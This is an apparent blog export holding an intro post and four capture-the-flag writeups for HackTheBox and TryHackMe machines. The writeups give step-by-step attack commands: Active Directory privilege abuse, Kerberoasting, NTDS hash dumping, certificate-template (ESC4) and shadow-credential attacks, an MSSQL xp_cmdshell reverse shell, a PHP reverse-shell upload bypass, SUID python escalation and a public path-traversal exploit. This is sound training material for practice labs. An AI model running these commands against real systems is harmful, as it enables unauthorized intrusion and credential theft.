[{"content":"üè¥‚Äç‚ò†Ô∏è Welcome to My Blog! This is my first post! I\u0026rsquo;ll be writing writeups for machines I solve on HackTheBox, TryHackMe, and other platforms.\nüßê About Me üë®‚Äçüíª Software Developer | üéì Uni Student (20 y/o) üìñ Studying software development \u0026amp; ethical hacking üîç Solving machines on THM \u0026amp; HTB üé• Learning from: s4vitar John Hammond Low Level Learning üé¨ Hobbies üì∫ Watching anime, TV series, and movies in my free time.\nüèÄ My favorite sport is basketball\n","date":"2025-02-09T00:00:00Z","image":"https://solarspectre.github.io/p/hello-world/cover_hu_c2dceab93b52d5b3.jpg","permalink":"https://solarspectre.github.io/p/hello-world/","title":"Hello World"},{"content":"Enumeration Let\u0026rsquo;s start with a scan to all ports:\n1 sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.61 -oG allPorts Here are the open ports\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 once it\u0026rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sudo nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.42 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 16:52 EDT Nmap scan report for 10.10.11.42 Host is up (0.26s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-12 03:52:41Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows add the domain to your /etc/hosts file\n1 10.10.11.61 administrator.htb dc.administrator.htb Run netexec with the credentials from hackthebox\n1 2 3 nxc winrm 10.10.11.42 -u Olivia -p ichliebedich WINRM 10.10.11.42 5985 DC [+] administrator.htb\\olivia:ichliebedich (Pwn3d!) Login to the machine using evil-winrm and run SharpHound to look for Attack paths\n1 2 evil-winrm -i 10.10.11.42 -u olivia -p \u0026#39;ichliebedich\u0026#39; upload SharpHound.exe Once you ingested the data in bloodhound, you can see that olivia has GenericAll meaning she has full control over michael\u0026rsquo;s account\nAnd Michael Can ForceChangePassword of Benjamin\nTo reset the password for these users you can use this commands\n1 2 3 net rpc password \u0026#34;michael\u0026#34; \u0026#39;P@ssw00rd!231!!!\u0026#39; -U \u0026#34;administrator.htb\u0026#34;/\u0026#34;Olivia\u0026#34;%\u0026#39;ichliebedich\u0026#39; -S dc.administrator.htb net rpc password \u0026#34;benjamin\u0026#34; \u0026#39;P@ssw00rd!555!!!\u0026#39; -U \u0026#34;administrator.htb\u0026#34;/\u0026#34;michael\u0026#34;%\u0026#39;P@ssw00rd!231!!!\u0026#39; -S dc.administrator.htb User Flag With these accounts you can look for access to other services like smb or ftp\n1 2 3 4 5 6 7 8 nxc ftp 10.10.11.42 -u benjamin -p \u0026#39;P@ssw00rd!555!!!\u0026#39; --ls FTP 10.10.11.42 21 10.10.11.42 [*] Banner: Microsoft FTP Service FTP 10.10.11.42 21 10.10.11.42 [+] benjamin:P@ssw00rd!555!!! FTP 10.10.11.42 21 10.10.11.42 [*] Directory Listing FTP 10.10.11.42 21 10.10.11.42 10-05-24 09:13AM 952 Backup.psafe3 nxc ftp 10.10.11.42 -u benjamin -p \u0026#39;P@ssw00rd!555!!!\u0026#39; --get Backup.psafe3 this is a password database file that\u0026rsquo;s protected by a master password, to crack that password you can use john the ripper\n1 2 3 4 5 6 7 8 9 pwsafe2john Backup.psafe3 \u0026gt; psafe3.hash john psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x]) Cost 1 (iteration count) is 2048 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status tekieromucho (Backu) with this password, open the database with passwordsafe\n1 2 sudo apt install passwordsafe pwsafe Backup.psafe3 you can login as emily with evil-winrm\n1 2 3 evil-winrm -i 10.10.11.42 -u emily -p PASSWORD *Evil-WinRM* PS C:\\Users\\emily\\Desktop\u0026gt; type user.txt XXXXXXXXXXXXXXXXXXXXXXXXXXX Root Flag Looking for attack paths as emily in bloodhound you can find that she has GenericWrite access on Ethan\u0026rsquo;s account, which means we can use this to do a targeted kerberoast attack to obtain the hash of ethan\u0026rsquo;s account and crack it with johntheripper\nUse faketime to sync your time with the DC and targetedKerberoast to execute the attack https://github.com/ShutdownRepo/targetedKerberoast\n1 faketime \u0026#34;$(ntpdate -q dc.administrator.htb | grep -oP \u0026#39;\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}\u0026#39;)\u0026#34; python targetedKerberoast.py -d \u0026#34;administrator.htb\u0026#34; -u \u0026#34;emily\u0026#34; -p \u0026#34;XXXXXXXXXXXXXXXXXXXXX\u0026#34; And crack the hash with john\n1 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Now that we have access to ethan\u0026rsquo;s account, we can dump the hashes for the administrator and obtain the root flag\n1 nxc smb 192.168.1.100 -u ethan -p \u0026#39;XXXXXXXXXXXXXX\u0026#39; --ntds --users administrator Login with evil-winrm as administrator and get the flag\n1 2 evil-winrm -i 10.10.11.42 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXX *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt Conclusion This machine covers topics like Kerberoasting, bloodhound, DCSync / Dump Hashes, GenericWrite, GenericAll,Password Cracking and Password Database leak\nHope you enjoy it and Happy Hacking!\n","date":"2025-04-01T00:00:00Z","image":"https://solarspectre.github.io/p/htb-administrator-writeup/cover_hu_ddf1e11f8b04e62f.jpg","permalink":"https://solarspectre.github.io/p/htb-administrator-writeup/","title":"HTB Administrator - Writeup"},{"content":"Enumeration Let\u0026rsquo;s start with a scan to all ports:\n1 sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.51 -oG allPorts once it\u0026rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.\n1 sudo nmap -sC -sV -p\u0026lt;ports\u0026gt; \u0026lt;ip\u0026gt; -oN targeted Add the domains from the scan to your /etc/hosts file\n1 10.10.11.51 DC01.sequel.htb sequel.htb Well, taking a look at smb with smbclient using the credentials that HackTheBox gives us we can see the share names for this domain\n1 smbclient -L 10.10.11.51 -U \u0026#39;rose\u0026#39; There\u0026rsquo;s a share called Accounting Department, list the contents of it\n1 smbclient //10.10.11.51/Accounting\\ Department -U \u0026#39;rose\u0026#39; we can download the files hosted there\n1 2 get accounts.xlsx get accounting_2024.xlsx You can see the contents of the accounts.xlsx file with https://jumpshare.com/viewer/xlsx\nUser Flag 1 netexec mssql 10.10.11.51 -u sa -p \u0026lt;password\u0026gt; --local-auth -M mssql_priv Now we\u0026rsquo;ve found another user (sa) to continue enumerating\nIt\u0026rsquo;s a sysadmin, so we can get a reverse shell with xp_cmdshell in mssql, login to it using impacket mssqlclient\n1 mssqlclient.py sa@10.10.11.51 Enable xp_cmdshell with:\n1 2 3 4 5 sp_configure \u0026#39;show advanced options\u0026#39;, 1; RECONFIGURE; sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; RECONFIGURE; Now execute the powershell reverse shell encoded in base64 with this, you can use https://www.revshells.com/:\n1 EXEC xp_cmdshell \u0026#39;powershell -e [base64ReverseShell]\u0026#39; Let\u0026rsquo;s start enumerating this machine, we can see a SQL2019 folder\nthere\u0026rsquo;s a file with credentials in ExpressAdv_ENU\n1 cat sql-Configuration.INI Create a list with all the users and passwords you\u0026rsquo;ve found to do a password spraying attack and find any reused passwords\n1 netexec smb 10.10.11.51 -u users.txt -p passwords.txt --continue-on-success ryan and sql_svc have the same password, so we can login to ryan using evilwinrm\n1 evil-winrm -i 10.10.11.51 -u ryan -p \u0026lt;password\u0026gt; Now you can get the user flag Root Flag Using Bloodhound community edition we can find a path to Administrator using the credentials of ryan\nSet the owner of the ca_svc account to ryan\n1 2 3 4 5 6 7 impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3 [*] Current owner information below [*] - SID: S-1-5-21-548670397-972687484-3496335370-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb [*] OwnerSid modified successfully! Grant Full Control Rights to ryan using DACL (Discretionary Access Control List) to escalate privileges\n1 2 3 impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3 [*] DACL backed up to dacledit-20250330-161623.bak [*] DACL modified successfully! Shadow Credentials attack\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 certipy-ad shadow auto -u \u0026#39;ryan@sequel.htb\u0026#39; -p \u0026#39;WqSZAF6CysDQbGb3\u0026#39; -account ca_svc -dc-ip 10.10.11.51 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Targeting user \u0026#39;ca_svc\u0026#39; [*] Generating certificate [*] Certificate generated [*] Generating Key Credential [*] Key Credential generated with DeviceID \u0026#39;ed99220f-857c-1616-06bc-e50d6900d173\u0026#39; [*] Adding Key Credential with device ID \u0026#39;ed99220f-857c-1616-06bc-e50d6900d173\u0026#39; to the Key Credentials for \u0026#39;ca_svc\u0026#39; [*] Successfully added Key Credential with device ID \u0026#39;ed99220f-857c-1616-06bc-e50d6900d173\u0026#39; to the Key Credentials for \u0026#39;ca_svc\u0026#39; [*] Authenticating as \u0026#39;ca_svc\u0026#39; with the certificate [*] Using principal: ca_svc@sequel.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;ca_svc.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;ca_svc\u0026#39; [*] Restoring the old Key Credentials for \u0026#39;ca_svc\u0026#39; [*] Successfully restored the old Key Credentials for \u0026#39;ca_svc\u0026#39; [*] NT hash for \u0026#39;ca_svc\u0026#39;: 3b181b914e7a9d5508ea1e20bc2b7fce Find a vulnerable template with the hash of the ca_svc account\n1 certipy-ad find -u \u0026#39;ca_svc@sequel.htb\u0026#39; -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable Now upload the certificate template\n1 KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb Get the Admin Cert\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 certipy-ad req -u ca_svc -hashes \u0026#39;3b181b914e7a9d5508ea1e20bc2b7fce\u0026#39; -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug Certipy v4.8.2 - by Oliver Lyak (ly4k) [+] Trying to resolve \u0026#39;sequel.htb\u0026#39; at \u0026#39;10.10.11.51\u0026#39; [+] Generating RSA key [*] Requesting certificate via RPC [+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\\pipe\\cert] [+] Connected to endpoint: ncacn_np:10.10.11.51[\\pipe\\cert] [*] Successfully requested certificate [*] Request ID is 22 [*] Got certificate with multiple identifications UPN: \u0026#39;administrator@sequel.htb\u0026#39; DNS Host Name: \u0026#39;10.10.11.51\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator_10.pfx\u0026#39; Now get the admin hash using the cert\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Found multiple identifications in certificate [*] Please select one: [0] UPN: \u0026#39;administrator@sequel.htb\u0026#39; [1] DNS Host Name: \u0026#39;10.10.11.51\u0026#39; \u0026gt; 0 [*] Using principal: administrator@sequel.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@sequel.htb\u0026#39;: xxxxxx:xxxx Login as Admin and you got the root flag\n1 evil-winrm -i 10.10.11.51 -u \u0026#34;administrator\u0026#34; -H \u0026#34;xxxxxxx\u0026#34; Conclusion This machine covers topics like SMB shares leaks, MSSQL RCE, ESC4 Certificate Attack, Shadow Credentials Attack, weak ACLs and AD CS misconfigurations\nHope you enjoy it and Happy Hacking!\n","date":"2025-03-17T00:00:00Z","image":"https://solarspectre.github.io/p/htb-escape-two-writeup/cover_hu_b59ab37ac8efd8cc.png","permalink":"https://solarspectre.github.io/p/htb-escape-two-writeup/","title":"HTB Escape Two - Writeup"},{"content":"Let\u0026rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:\n1 rustscan --top -a \u0026lt;victim_ip\u0026gt; | tee initialScan.txt once it\u0026rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports\n1 sudo nmap -sC -sV -p\u0026lt;ports\u0026gt; \u0026lt;ip\u0026gt; -oN targeted Now, the scan shows that the machine is hosting a web server with Apache, we can take a look at the directories the website has with gobuster\n1 gobuster dir -t 45 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://\u0026lt;ip\u0026gt;/ Task 2 How many ports are open? 2 What version of Apache is running? 2.4.29 What service is running on port 22? SSH What is the hidden directory? /panel/ User Flag Visiting the website shows us this and going to the /panel route shows a file upload page There\u0026rsquo;s an arbitrary file upload vulnerability in this page, allowing us to upload a maliciously crafted php file that we can use to upload and execute a reverse shell, you can use this shell from pentestmonkey https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nBut php is not allowed to be uploaded, we can bypass this validation changing the file extension to be php5\nThen start a listener with netcat:\n1 nc -lvnp 4242 navigate to the route where your file is uploaded, for example: /uploads/shell.php5 and you got the shell\nOnce obtained the shell, let\u0026rsquo;s find the flag and get it!\n1 2 find / -name user.txt 2\u0026gt;/dev/null cat /var/www/user.txt Root Flag Find binaries with SUID permissions that allow users to execute the binary with the permissions of the owner of the file, rather than the user who runs the command (most of the times is root).\n1 find / -perm -4000 2\u0026gt;/dev/null And look at that, python? Let\u0026rsquo;s check what user is the owner of the binary\n1 2 ls -la /usr/bin/python -rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/python Sweet! it\u0026rsquo;s root. You can use gtfobins to look for info about a binary you can possibly use to escalate privileges: https://gtfobins.github.io/gtfobins/python/ we can execute a oneliner to spawn a shell as root and obtain the final flag\n1 /usr/bin/python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;,\u0026#34;sh\u0026#34;,\u0026#34;-p\u0026#34;)\u0026#39; 1 cat /root/root.txt and you got the root flag!!\nConclusion This machine covers topics like Arbitrary File Uploads and exploiting binaries with SUID permissions to escalate privileges.\nHope you enjoyed it and Happy Hacking!\n","date":"2025-03-05T00:00:00Z","image":"https://solarspectre.github.io/p/thm-root-me-writeup/cover_hu_5613444a6b14387c.png","permalink":"https://solarspectre.github.io/p/thm-root-me-writeup/","title":"THM Root Me - Writeup"},{"content":"Let\u0026rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:\n1 rustscan --top -a \u0026lt;victim_ip\u0026gt; | tee initialScan.txt once it\u0026rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports\n1 sudo nmap -sC -sV -p\u0026lt;ports\u0026gt; \u0026lt;ip\u0026gt; -oN targeted Now, the scan shows that the machine is hosting a web server with Python, we can take a look at the website to investigate more using burpsuite as a proxy to intercept all the traffic. Register an account and login to it.\nUser Flag There\u0026rsquo;s an Arbitrary code execution vulnerability in the dashboard, allowing us to upload a maliciously crafted cfi file that we can use to upload and execute a reverse shell https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f Just upload it and view it to execute the reverse shell\nOnce obtained the shell, let\u0026rsquo;s enumerate the contents in the directory There\u0026rsquo;s a users table where they store the credentials\n1 sqlite3 database.db \u0026#39;select * from user;\u0026#39; You can crack it with hashcat\n1 hashcat -m 0 creds.txt rockyou.txt --user You can try the credentials you obtained to login to the dashboard, maybe they used the same credentials to login to ssh\nrosa\u0026hellip; why? anyways, here\u0026rsquo;s your user flag\n1 cat user.txt Root Flag Find other ports that the host is using but aren\u0026rsquo;t public\n1 netstat -tuln Using port forward, we can see the contents of that page\n1 ssh -L 5555:localhost:8080 rosa@10.10.11.38 we can also use whatweb to see the technologies that the page uses\n1 whatweb http://localhost:5555 look for directories with gobuster\nlooking for vulnerabilities of the website technologies you can find the CVE-2024-23334 for the Aiohttp version that the website is using, here\u0026rsquo;s a python script that exploits it: https://github.com/wizarddos/CVE-2024-23334\n1 python exploit.py -u \u0026#34;http://localhost:5555\u0026#34; -f \u0026#34;/root/root.txt\u0026#34; -d \u0026#34;/assets\u0026#34; and you got the root flag!!\nConclusion This machine covers topics like LFI, port forwarding, looking for CVEs and password cracking.\nHope you enjoy it and Happy Hacking!\n","date":"2025-02-20T00:00:00Z","image":"https://solarspectre.github.io/p/htb-chemistry-writeup/cover_hu_33d700f969b72b1c.png","permalink":"https://solarspectre.github.io/p/htb-chemistry-writeup/","title":"HTB Chemistry - Writeup"}]